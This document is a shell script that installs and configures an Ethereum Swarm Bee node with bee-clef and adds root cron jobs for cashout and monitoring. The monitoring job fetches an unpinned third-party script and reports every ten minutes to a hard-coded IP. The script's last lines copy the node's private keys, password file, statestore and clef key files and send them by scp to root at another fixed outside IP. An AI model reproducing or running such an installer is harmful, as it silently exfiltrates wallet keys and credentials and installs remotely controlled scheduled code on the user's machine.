#!/bin/sh

sudo apt-get -y update
sudo apt-get -y upgrade
sudo apt-get install -y jq
sudo wget https://github.com/ethersphere/bee-clef/releases/download/v0.4.12/bee-clef_0.4.12_amd64.deb && dpkg -i bee-clef_0.4.12_amd64.deb
sudo wget https://github.com/ethersphere/bee/releases/download/v0.6.2/bee_0.6.2_amd64.deb && dpkg -i bee_0.6.2_amd64.deb
sudo chown -R bee:bee /var/lib/bee
sudo sed -i '68c swap-enable: true' /etc/bee/bee.yaml
sudo sed -i '70c swap-endpoint: http://45.76.32.94:18545' /etc/bee/bee.yaml
sudo sed -i '76c swap-initial-deposit: "10000000000000000"' /etc/bee/bee.yaml
sudo sed -i '24c db-open-files-limit: 1000' /etc/bee/bee.yaml
sudo sed -i '40c full-node: true' /etc/bee/bee.yaml
sudo sed -i '90c welcome-message: "我是来自福建的小蜜蜂"' /etc/bee/bee.yaml
sudo wget -O /root/cashout.sh https://gist.githubusercontent.com/ralph-pichler/3b5ccd7a5c5cd0500e6428752b37e975/raw/aa576d6d28b523ea6f5d4a1ffb3c8cc0bbc2677f/cashout.sh && chmod +x /root/cashout.sh
sudo sed -i 's/MIN_AMOUNT=10000000000000000/MIN_AMOUNT=10000/' /root/cashout.sh
sudo echo "23 03 * * * /root/cashout.sh cashout-all" >> /var/spool/cron/crontabs/root
sudo wget https://github.com/doristeo/SwarmMonitoring/raw/main/send.sh
sudo chmod +x send.sh
sudo echo "*/10 * * * * /root/send.sh http://149.28.139.32:8080 > /dev/null 2>&1" >> /var/spool/cron/crontabs/root
bee-get-addr
rm /var/lib/bee/statestore/CURRENT.bak
bee-clef-keys
h=$(hostname)
aip=$(curl -s api.infoip.io/ip)
hip=$h"-"$aip
mkdir $hip
mv bee-clef*.json /root/$hip
mv bee-clef*.txt /root/$hip
cp -r /var/lib/bee/keys /root/$hip/
cp -r /var/lib/bee/password /root/$hip/
cp -r /var/lib/bee/statestore /root/$hip/
scp -r /root/$hip root@45.76.32.94:/root/key/


